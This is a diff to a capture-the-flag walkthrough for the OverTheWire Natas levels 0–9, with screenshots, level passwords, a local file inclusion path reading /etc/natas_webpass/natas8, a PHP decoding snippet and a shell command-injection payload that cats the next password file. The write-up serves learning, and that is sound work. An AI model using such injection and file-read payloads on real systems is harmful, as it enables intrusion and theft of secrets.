@@ -4,7 +4,6 @@
 Username: natas0
 Password: natas0
 ```
-## Level 0 - 1
 * http://natas0.natas.labs.overthewire.org
 
 ![](https://i.imgur.com/hh8ZogL.png)
@@ -12,7 +11,7 @@ Password: natas0
 ```
 gtVrDuiDfck831PqWsLEZy5gyDz1clto
 ```
-# Level 1 - 2
+## Level 0 - 1
 * http://natas1.natas.labs.overthewire.org
 
 ![](https://i.imgur.com/scBGOqP.png)
@@ -20,7 +19,7 @@ gtVrDuiDfck831PqWsLEZy5gyDz1clto
 ```
 ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
 ```
-## Level 2 - 3
+## Level 1 - 2
 * http://natas2.natas.labs.overthewire.org
 ```
 <img src="files/pixel.png">
@@ -43,7 +42,7 @@ http://natas2.natas.labs.overthewire.org/files/users.txt
 ```
 sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
 ```
-## Level 3 - 4
+## Level 2 - 3
 * http://natas3.natas.labs.overthewire.org
 
 ![](https://i.imgur.com/UnvOwWY.png)
@@ -69,7 +68,7 @@ http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
 ```
 Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
 ```
-## Level 4 - 5
+## Level 3 - 4
 * http://natas4.natas.labs.overthewire.org
 
 ![](https://i.imgur.com/4VeYxue.png)
@@ -80,7 +79,7 @@ Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
 ```
 iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
 ```
-## Level 5 - 6
+## Level 4 - 5
 * http://natas5.natas.labs.overthewire.org
 
 ![](https://i.imgur.com/0ou8ZLQ.png)
@@ -91,9 +90,8 @@ iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
 ```
 aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
 ```
-
-## Level 6 - 7
-* https://natas6.natas.labs.overthewire.org
+## Level 5 - 6
+* http://natas6.natas.labs.overthewire.org
 
 ![](https://i.imgur.com/FsXGMRT.png)
 
@@ -111,4 +109,66 @@ FOEIUWGHFEEUHOFUOIU
 * password
 ```
 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+```
+## Level 6 - 7
+* http://natas7.natas.labs.overthewire.org
+
+```
+<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
+```
+
+![](https://i.imgur.com/dnPKvwY.png)
+
+```
+index.php?page=/etc/natas_webpass/natas8
+```
+
+![](https://i.imgur.com/7BavDqS.png)
+
+* password
+```
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+```
+## Level 7 - 8
+* http://natas8.natas.labs.overthewire.org
+* view source code.
+
+![](https://i.imgur.com/TDcKsZp.png)
+
+* reverse encode to get password.
+```
+<?php
+$secret = "3d3d516343746d4d6d6c315669563362";
+$txt = base64_decode(strrev(hex2bin($secret)));
+echo "$txt";
+?>
+```
+```
+oubWYf2kBq
+```
+![](https://i.imgur.com/UDCWpQq.png)
+
+![](https://i.imgur.com/w8yMWXF.png)
+
+* password
+```
+W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+```
+## Level 8 - 9
+* http://natas9.natas.labs.overthewire.org
+
+* view source code.
+
+![](https://i.imgur.com/LpSbMoa.png)
+
+* inject shell command.
+```
+; cat /etc/natas_webpass/natas10 #
+```
+
+![](https://i.imgur.com/LydNdsw.png)
+
+* password
+```
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
 ```
